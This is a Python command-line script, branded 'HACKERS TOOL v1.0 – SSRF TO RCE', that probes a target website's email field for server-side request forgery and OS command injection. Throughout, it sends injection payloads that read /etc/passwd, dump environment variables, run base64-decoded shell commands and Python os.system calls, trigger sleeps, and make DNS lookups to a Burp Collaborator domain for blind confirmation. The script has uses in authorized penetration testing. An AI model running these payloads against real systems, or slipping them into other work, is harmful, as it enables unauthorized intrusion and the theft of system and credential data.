#!/usr/bin/env python3
"""
Enhanced SSRF to RCE testing script with reduced false positives
Author: Security Tester
Usage: python3 ssrf_rce_tester.py -u <URL> -p <PARAM> -c <COLLABORATOR_DOMAIN>
"""

import requests
import time
import random
import string
import argparse
import sys
from urllib.parse import urlparse, parse_qs, urlencode
import urllib3
import hashlib
import re
print("""

███╗░░██╗██╗░░░██╗██╗░░░░░██╗░░░░░██████╗░░█████╗░░█████╗░  ░█████╗░██╗░░██╗
████╗░██║██║░░░██║██║░░░░░██║░░░░░╚════██╗██╔══██╗██╔══██╗  ██╔══██╗██║░██╔╝
██╔██╗██║██║░░░██║██║░░░░░██║░░░░░░░███╔═╝██║░░██║██║░░██║  ██║░░██║█████═╝░
██║╚████║██║░░░██║██║░░░░░██║░░░░░██╔══╝░░██║░░██║██║░░██║  ██║░░██║██╔═██╗░
██║░╚███║╚██████╔╝███████╗███████╗███████╗╚█████╔╝╚█████╔╝  ╚█████╔╝██║░╚██╗
╚═╝░░╚══╝░╚═════╝░╚══════╝╚══════╝╚══════╝░╚════╝░░╚════╝░  ░╚════╝░╚═╝░░╚═╝
HACKERS TOOL v1.0 – SSRF TO RCE  – NULL200OK💀🔥created by NABEEL

""")


# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SSRFtoRCETester:
    def __init__(self, url, param, collaborator_domain):
        """
        Initialize the tester
        """
        self.url = url
        self.param = param
        self.collaborator_domain = collaborator_domain
        
        # Session for maintaining cookies
        self.session = requests.Session()
        
        # Headers to mimic browser
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'X-Forwarded-For': '127.0.0.1'
        }
        
        # Payload tracking
        self.tested_payloads = []
        
        # Generate unique identifiers for tracking
        self.session_id = self.generate_random_string(8)
        
        # Results storage
        self.results = {
            'ssrf_hits': [],
            'rce_hits': [],
            'blind_hits': [],
            'potential_hits': []
        }
        
        # Baseline response for comparison
        self.baseline_response = None
        self.baseline_hash = None
        self.baseline_length = None
        
        # Wordlist of common web page terms (to ignore)
        self.common_web_terms = [
            'html', 'head', 'body', 'div', 'span', 'class', 'id', 'style',
            'script', 'function', 'var', 'let', 'const', 'return', 'if', 'else',
            'for', 'while', 'document', 'window', 'alert', 'console', 'log',
            'http', 'https', 'www', 'com', 'org', 'net', 'boot', 'bootstrap',
            'jquery', 'ajax', 'json', 'xml', 'css', 'stylesheet', 'meta',
            'title', 'link', 'img', 'src', 'href', 'alt', 'width', 'height',
            'padding', 'margin', 'border', 'color', 'background', 'font',
            'login', 'logout', 'signin', 'signup', 'register', 'password',
            'username', 'email', 'submit', 'button', 'form', 'input', 'label',
            'table', 'tr', 'td', 'th', 'row', 'col', 'menu', 'nav', 'header',
            'footer', 'content', 'container', 'wrapper', 'main', 'section'
        ]
        
        # Specific command output indicators (less false positives)
        self.command_indicators = [
            # Linux command output patterns
            r'root:[^:]*:[^:]*:[^:]*:[^:]*:[^:]*:[^:]*',  # /etc/passwd format
            r'uid=\d+\([^)]*\)\s+gid=\d+\([^)]*\)',  # id command output
            r'total\s+\d+',  # ls -la output
            r'[drwx\-]+\s+\d+\s+\w+\s+\w+\s+\d+\s+[\w:]+\s+[\w\.\-]+',  # ls -la line
            r'/bin/(bash|sh|dash|zsh)',  # Shell paths
            r'/home/\w+',  # Home directories
            
            # Error messages from command execution
            r'bash:\s+[\w\-\.]+:\s+(command not found|No such file or directory|Permission denied)',
            r'sh(:\s+\d+)?:\s+[\w\-\.]+:\s+(not found|not found|permission denied)',
            r'/bin/sh:\s+\d+:\s+[\w\-\.]+:\s+(not found|not found)',
            
            # Process/user info
            r'USER\s+PID\s+%CPU\s+%MEM\s+VSZ\s+RSS\s+TTY\s+STAT\s+START\s+TIME\s+COMMAND',
            r'\w+\s+\d+\s+\d+\.\d+\s+\d+\.\d+\s+\d+\s+\d+\s+\?\s+\w+\s+[\w:]+\s+\d+:\d+\s+[\w\/\-\.]+',
            
            # Windows specific
            r'Volume in drive [A-Z] is',
            r'Directory of [A-Z]:\\\\',
            r'[\d\/]+\s+[\d:]+\s+[\d,]+\s+[\w\.\-]+',
            r'Microsoft Windows \[Version \d+\.\d+\.\d+\]',
            
            # System info
            r'Linux [\w\-\.]+ \d+\.\d+\.\d+',  # uname -a
            r'x86_64|amd64|i386|i686|arm64|aarch64',  # Architectures
        ]
    
    def generate_random_string(self, length=8):
        """Generate random string for tracking"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def establish_baseline(self):
        """Establish baseline response for comparison"""
        print("[*] Establishing baseline response...")
        
        # Send a normal valid email
        baseline_email = f"baseline{self.generate_random_string(4)}@example.com"
        payload = {self.param: baseline_email}
        
        response = self.make_request(payload, is_baseline=True)
        
        if response:
            self.baseline_response = response.text
            self.baseline_hash = self.calculate_hash(response.text)
            self.baseline_length = len(response.text)
            print(f"[+] Baseline established: {self.baseline_length} chars, hash: {self.baseline_hash[:16]}...")
        else:
            print("[!] Failed to establish baseline")
            self.baseline_response = ""
            self.baseline_hash = ""
            self.baseline_length = 0
    
    def calculate_hash(self, text):
        """Calculate hash of text for comparison"""
        return hashlib.md5(text.encode('utf-8')).hexdigest()
    
    def is_response_different(self, response_text, threshold=0.3):
        """
        Check if response is significantly different from baseline
        threshold: 0.3 means 30% difference required
        """
        if not self.baseline_response:
            return True
        
        current_hash = self.calculate_hash(response_text)
        current_length = len(response_text)
        
        # Quick check: same hash means identical response
        if current_hash == self.baseline_hash:
            return False
        
        # Check length difference
        length_diff = abs(current_length - self.baseline_length) / max(self.baseline_length, 1)
        
        # Check content difference (simple word-based comparison)
        baseline_words = set(re.findall(r'\b\w+\b', self.baseline_response.lower()))
        current_words = set(re.findall(r'\b\w+\b', response_text.lower()))
        
        common_words = baseline_words.intersection(current_words)
        unique_words = baseline_words.symmetric_difference(current_words)
        
        # Filter out common web terms from unique words
        filtered_unique = [w for w in unique_words if w not in self.common_web_terms]
        
        word_diff_ratio = len(filtered_unique) / max(len(baseline_words), 1)
        
        # Consider different if either length or word difference is significant
        return length_diff > threshold or word_diff_ratio > threshold
    
    def contains_command_output(self, text):
        """Check if text contains actual command output patterns"""
        # First, check for specific command output patterns
        for pattern in self.command_indicators:
            if re.search(pattern, text, re.IGNORECASE):
                return True, f"Pattern matched: {pattern}"
        
        # Check for shell error patterns
        shell_error_patterns = [
            r'bash:[\s\w\-\.]+: command not found',
            r'sh:[\s\d]+: [\w\-\.]+: not found',
            r'/bin/(bash|sh): line \d+: [\w\-\.]+: command not found',
            r'command not found',
            r'No such file or directory',
            r'Permission denied',
        ]
        
        for pattern in shell_error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True, f"Shell error: {pattern}"
        
        # Check for unexpected system paths in response
        system_paths = [
            r'/etc/passwd', r'/etc/shadow', r'/etc/hosts',
            r'/proc/', r'/sys/', r'/dev/', r'/tmp/', r'/var/log/',
            r'C:\\Windows\\', r'C:\\Program Files\\',
        ]
        
        for path in system_paths:
            if re.search(path, text, re.IGNORECASE):
                return True, f"System path found: {path}"
        
        return False, ""
    
    def test_ssrf(self, test_id=None):
        """
        Step 1: Test for SSRF using Burp Collaborator
        """
        if not test_id:
            test_id = self.generate_random_string(6)
        
        # Create test email with collaborator domain
        test_email = f"test{test_id}@{self.collaborator_domain}"
        
        print(f"[*] Testing SSRF with email: {test_email}")
        
        # Prepare the payload
        payload = {self.param: test_email}
        
        # Make the request
        response = self.make_request(payload)
        
        # Store the tested payload
        self.tested_payloads.append({
            'type': 'ssrf_test',
            'payload': test_email,
            'response_code': response.status_code if response else 'N/A',
            'test_id': test_id
        })
        
        print(f"[+] SSRF test completed. Check Burp Collaborator for hits.")
        print(f"[!] If you see HTTP hits in Burp, proceed to RCE testing")
        
        return True
    
    def test_command_injection(self, operator=';'):
        """
        Step 2: Test for command injection in email field
        """
        print(f"\n[*] Testing command injection with operator: {operator}")
        
        payloads = [
            # Basic command execution
            f"test@example.com{operator}whoami",
            f"test@example.com{operator}id",
            f"test@example.com{operator}uname${{IFS}}-a",
            
            # File operations
            f"test@example.com{operator}ls${{IFS}}-la${{IFS}}/etc/passwd",
            f"test@example.com{operator}cat${{IFS}}/etc/passwd",
            f"test@example.com{operator}head${{IFS}}-n${{IFS}}1${{IFS}}/etc/passwd",
            
            # Network commands
            f"test@example.com{operator}ping${{IFS}}-c${{IFS}}1${{IFS}}127.0.0.1",
            f"test@example.com{operator}nslookup${{IFS}}google.com",
            
            # Environment info
            f"test@example.com{operator}env",
            f"test@example.com{operator}pwd",
        ]
        
        for payload in payloads:
            print(f"  [-] Testing: {payload}")
            
            response = self.make_request({self.param: payload})
            
            # Check for potential command output in response
            if response:
                self.check_response(response, payload)
            
            time.sleep(0.5)
        
        return True
    
    def check_response(self, response, payload):
        """Intelligent response checking with false positive reduction"""
        response_text = response.text
        
        # Step 1: Check if response is significantly different from baseline
        if not self.is_response_different(response_text):
            # Response is similar to baseline, likely not vulnerable
            return False
        
        # Step 2: Check for actual command output patterns
        contains_command, reason = self.contains_command_output(response_text)
        
        if contains_command:
            print(f"[!] HIGH CONFIDENCE RCE DETECTED!")
            print(f"    Payload: {payload}")
            print(f"    Reason: {reason}")
            print(f"    Response code: {response.status_code}")
            print(f"    Response length: {len(response_text)}")
            
            self.results['rce_hits'].append({
                'payload': payload,
                'reason': reason,
                'response_preview': response_text[:500],
                'status_code': response.status_code,
                'confidence': 'high'
            })
            return True
        
        # Step 3: Check for error messages that might indicate command execution
        error_indicators = [
            (r'500 Internal Server Error', 'server_error'),
            (r'Error\s+\d+', 'generic_error'),
            (r'syntax error', 'syntax_error'),
            (r'parse error', 'parse_error'),
        ]
        
        for pattern, error_type in error_indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                # Check if this error is different from baseline
                if not re.search(pattern, self.baseline_response, re.IGNORECASE):
                    print(f"[*] Potential vulnerability (error triggered)")
                    print(f"    Payload: {payload}")
                    print(f"    Error type: {error_type}")
                    
                    self.results['potential_hits'].append({
                        'payload': payload,
                        'error_type': error_type,
                        'response_preview': response_text[:300],
                        'status_code': response.status_code,
                        'confidence': 'medium'
                    })
                    return True
        
        # Step 4: Check for unusual status codes
        if response.status_code >= 500:
            print(f"[*] Server error response")
            print(f"    Payload: {payload}")
            print(f"    Status: {response.status_code}")
            
            self.results['potential_hits'].append({
                'payload': payload,
                'error_type': f'http_{response.status_code}',
                'response_preview': response_text[:200],
                'status_code': response.status_code,
                'confidence': 'low'
            })
            return True
        
        return False
    
    def test_all_injection_operators(self):
        """Test command injection with different operators"""
        operators = [';', '|', '||', '&', '&&', '`', '$(']
        
        print("\n" + "="*60)
        print("[*] Testing all injection operators")
        print("="*60)
        
        for operator in operators:
            print(f"\n[*] Testing operator: '{operator}'")
            self.test_command_injection(operator)
            time.sleep(1)
    
    def test_email_format_variations(self):
        """Test payloads in different parts of the email"""
        print("\n" + "="*60)
        print("[*] Testing email format variations")
        print("="*60)
        
        variations = [
            # Payload in local part (before @)
            ("test`whoami`@example.com", "Backticks in local part"),
            ("test$(id)@example.com", "Command substitution in local part"),
            ("test;id@example.com", "Semicolon in local part"),
            
            # Payload in domain part (after @)
            ("test@example.com;id", "Semicolon in domain"),
            ("test@`whoami`.com", "Backticks in domain"),
            ("test@$(id).com", "Command substitution in domain"),
        ]
        
        for payload, description in variations:
            print(f"\n[*] Testing: {description}")
            print(f"  [-] Payload: {payload}")
            
            response = self.make_request({self.param: payload})
            
            if response:
                self.check_response(response, payload)
            
            time.sleep(0.3)
    
    def test_blind_os_injection(self, operator=';'):
        """
        Test for blind OS command injection with false positive reduction
        """
        print(f"\n[*] Testing blind OS injection with operator: {operator}")
        
        unique_id = self.generate_random_string(6)
        
        print(f"[*] Unique test ID: {unique_id}")
        print(f"[*] Check Burp Collaborator for hits with ID: {unique_id}")
        
        # Time-based blind injection with multiple durations for confirmation
        time_payloads = [
            (f"test@example.com{operator}sleep${{IFS}}2", 2),
            (f"test@example.com{operator}ping${{IFS}}-c${{IFS}}2${{IFS}}127.0.0.1", 2),
            (f"test@example.com{operator}timeout${{IFS}}2${{IFS}}true", 2),
        ]
        
        print("\n[*] Testing time-based blind injection...")
        confirmed_delays = []
        
        for payload, expected_delay in time_payloads:
            print(f"  [-] Sending: {payload}")
            
            # Get baseline timing first
            baseline_start = time.time()
            baseline_response = self.make_request({self.param: "test@example.com"})
            baseline_elapsed = time.time() - baseline_start
            
            # Then test payload
            start_time = time.time()
            response = self.make_request({self.param: payload})
            elapsed = time.time() - start_time
            
            # Calculate actual delay (subtract baseline)
            actual_delay = max(0, elapsed - baseline_elapsed)
            
            # Only consider significant delays (75% of expected or more)
            if actual_delay >= expected_delay * 0.75:
                print(f"[!] SIGNIFICANT TIME DELAY: {actual_delay:.2f}s (expected: {expected_delay}s)")
                confirmed_delays.append({
                    'payload': payload,
                    'delay': actual_delay,
                    'expected': expected_delay
                })
            
            time.sleep(3)  # Wait between tests
        
        # Only report if multiple tests confirm delays
        if len(confirmed_delays) >= 2:
            print(f"[!] BLIND TIME-BASED INJECTION CONFIRMED!")
            for delay_info in confirmed_delays:
                self.results['blind_hits'].append({
                    'type': 'time_based',
                    'payload': delay_info['payload'],
                    'delay': delay_info['delay'],
                    'confidence': 'high'
                })
        
        # DNS-based blind injection
        dns_payloads = [
            f"test@example.com{operator}nslookup${{IFS}}{unique_id}.{self.collaborator_domain}",
            f"test@example.com{operator}ping${{IFS}}-c${{IFS}}1${{IFS}}{unique_id}.{self.collaborator_domain}",
        ]
        
        print("\n[*] Testing DNS-based blind injection...")
        for payload in dns_payloads:
            print(f"  [-] Sending: {payload}")
            self.make_request({self.param: payload})
            time.sleep(1)
        
        return True
    
    def test_advanced_payloads(self):
        """Test more advanced payloads"""
        print("\n" + "="*60)
        print("[*] Testing advanced payloads")
        print("="*60)
        
        advanced_payloads = [
            # Using encoded commands
            ("test@example.com;echo${IFS}Y2F0IC9ldGMvcGFzc3dkCg==|base64${IFS}-d|sh", "Base64 encoded"),
            
            # Using Python
            ("test@example.com;python${IFS}-c${IFS}'import${IFS}os;os.system(\"id\")'", "Python"),
            
            # Chained commands
            ("test@example.com;id;ls${IFS}-la;pwd", "Chained commands"),
        ]
        
        for payload, description in advanced_payloads:
            print(f"\n[*] Testing: {description}")
            print(f"  [-] Payload: {payload[:80]}...")
            
            response = self.make_request({self.param: payload})
            
            if response:
                self.check_response(response, payload)
            
            time.sleep(1)
    
    def make_request(self, data, is_baseline=False):
        """Make HTTP request to target"""
        try:
            if not is_baseline:
                param_value = list(data.values())[0]
                display_value = param_value[:50] + "..." if len(param_value) > 50 else param_value
                print(f"    Sending: {display_value}")
            
            parsed_url = urlparse(self.url)
            
            if parsed_url.query:
                existing_params = parse_qs(parsed_url.query)
                for key in existing_params:
                    if isinstance(existing_params[key], list) and len(existing_params[key]) > 0:
                        existing_params[key] = existing_params[key][0]
                
                existing_params.update(data)
                url_without_query = self.url.split('?')[0]
                
                response = self.session.get(
                    url_without_query,
                    params=existing_params,
                    headers=self.headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=True
                )
            else:
                response = self.session.post(
                    self.url,
                    data=data,
                    headers=self.headers,
                    timeout=15,
                    verify=False,
                    allow_redirects=True
                )
            
            if not is_baseline:
                print(f"    Response: {response.status_code} ({len(response.text)} chars)")
            
            return response
            
        except requests.exceptions.Timeout:
            print("[!] Request timed out")
            return None
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")
            return None
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
            return None
    
    def run_complete_test(self):
        """Run the complete testing methodology"""
        print(f"""
╔══════════════════════════════════════════════════════╗
║      Enhanced SSRF to RCE Testing Script            ║
║      Target: {self.url:<30} ║
║      Parameter: {self.param:<27} ║
║      Session ID: {self.session_id:<25} ║
╚══════════════════════════════════════════════════════╝
        """)
        
        # Establish baseline first
        self.establish_baseline()
        
        # Step 1: Initial SSRF test
        print("\n[+] STEP 1: Initial SSRF Testing")
        self.test_ssrf()
        
        print("\n" + "-"*60)
        print("[!] MANUAL STEP REQUIRED:")
        print("[!] Check your Burp Collaborator for HTTP/DNS hits")
        print("[!] If you see hits, press Enter to continue to RCE testing")
        print("[!] If no hits, the server may not be vulnerable to SSRF")
        input("[?] Press Enter to continue or Ctrl+C to abort...")
        
        # Step 2: Command injection testing
        print("\n[+] STEP 2: Basic Command Injection Testing")
        self.test_command_injection()
        
        # Step 3: Test all operators
        self.test_all_injection_operators()
        
        # Step 4: Test email variations
        self.test_email_format_variations()
        
        # Step 5: Advanced payloads
        self.test_advanced_payloads()
        
        # Step 6: Blind injection testing
        print("\n[+] STEP 6: Blind OS Injection Testing")
        self.test_blind_os_injection()
        
        # Summary
        self.print_summary()
    
    def print_summary(self):
        """Print testing summary"""
        print("\n" + "="*60)
        print("TESTING SUMMARY")
        print("="*60)
        
        print(f"\n[*] Baseline established: {self.baseline_length} chars")
        print(f"[*] Total payloads tested: {len(self.tested_payloads)}")
        
        # High confidence RCE hits
        if self.results['rce_hits']:
            print(f"\n[!] HIGH CONFIDENCE RCE VULNERABILITIES FOUND: {len(self.results['rce_hits'])}")
            for i, hit in enumerate(self.results['rce_hits'], 1):
                print(f"\n  {i}. Payload: {hit['payload']}")
                print(f"     Reason: {hit['reason']}")
                print(f"     Confidence: {hit.get('confidence', 'high')}")
                print(f"     Status: {hit.get('status_code', 'N/A')}")
        
        # Blind injection hits
        if self.results['blind_hits']:
            print(f"\n[!] BLIND INJECTION FOUND: {len(self.results['blind_hits'])}")
            for i, hit in enumerate(self.results['blind_hits'], 1):
                print(f"\n  {i}. Type: {hit['type']}")
                print(f"     Payload: {hit['payload']}")
                if 'delay' in hit:
                    print(f"     Delay: {hit['delay']:.2f} seconds")
                print(f"     Confidence: {hit.get('confidence', 'medium')}")
        
        # Potential hits (lower confidence)
        if self.results['potential_hits']:
            print(f"\n[*] POTENTIAL FINDINGS (NEEDS VERIFICATION): {len(self.results['potential_hits'])}")
            for i, hit in enumerate(self.results['potential_hits'][:5], 1):  # Show top 5
                print(f"\n  {i}. Payload: {hit['payload']}")
                print(f"     Type: {hit.get('error_type', 'unknown')}")
                print(f"     Confidence: {hit.get('confidence', 'low')}")
                print(f"     Status: {hit.get('status_code', 'N/A')}")
            
            if len(self.results['potential_hits']) > 5:
                print(f"  ... and {len(self.results['potential_hits']) - 5} more")
        
        # No findings
        if not any([self.results['rce_hits'], self.results['blind_hits'], self.results['potential_hits']]):
            print("\n[-] No vulnerabilities detected")
            print("[*] This application appears to properly sanitize email inputs")
        
        print("\n" + "-"*60)
        print("[*] RECOMMENDATIONS:")
        
        if self.results['rce_hits']:
            print("[!] IMMEDIATE ACTION REQUIRED: Application is vulnerable to RCE")
            print("    - Patch immediately")
            print("    - Review all user inputs")
            print("    - Implement proper input validation")
        
        elif self.results['blind_hits'] or self.results['potential_hits']:
            print("[*] FURTHER INVESTIGATION RECOMMENDED:")
            print("    - Manually verify potential findings")
            print("    - Test with different payload variations")
            print("    - Check server logs for errors")
        
        else:
            print("[✓] Application appears secure against email-based RCE")
            print("    - Continue with other security tests")
        
        print(f"\n[*] Session ID for reference: {self.session_id}")

def main():
    parser = argparse.ArgumentParser(
        description="Enhanced SSRF to RCE testing with reduced false positives",
        epilog="Example: python3 ssrf_rce_tester.py -u https://target.com/login -p email -c abc123.burpcollaborator.net"
    )
    
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", required=True, help="Email parameter name")
    parser.add_argument("-c", "--collaborator", required=True, help="Burp Collaborator domain")
    parser.add_argument("-o", "--output", help="Output file for results")
    parser.add_argument("--skip-ssrf", action="store_true", help="Skip initial SSRF test")
    parser.add_argument("--test-only", choices=['ssrf', 'rce', 'blind', 'advanced'], help="Test only specific type")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    # Create tester instance
    tester = SSRFtoRCETester(args.url, args.param, args.collaborator)
    
    # Run tests
    if args.test_only == 'ssrf':
        tester.test_ssrf()
    elif args.test_only == 'rce':
        tester.establish_baseline()
        tester.test_command_injection()
        tester.test_all_injection_operators()
    elif args.test_only == 'blind':
        tester.test_blind_os_injection()
    elif args.test_only == 'advanced':
        tester.establish_baseline()
        tester.test_advanced_payloads()
    else:
        tester.run_complete_test()
    
    # Save results
    if args.output:
        with open(args.output, 'w') as f:
            import json
            json.dump({
                'target': args.url,
                'parameter': args.param,
                'baseline_length': tester.baseline_length,
                'tested_payloads_count': len(tester.tested_payloads),
                'results': tester.results,
                'session_id': tester.session_id
            }, f, indent=2)
        print(f"\n[+] Results saved to {args.output}")

if __name__ == "__main__":
    main()
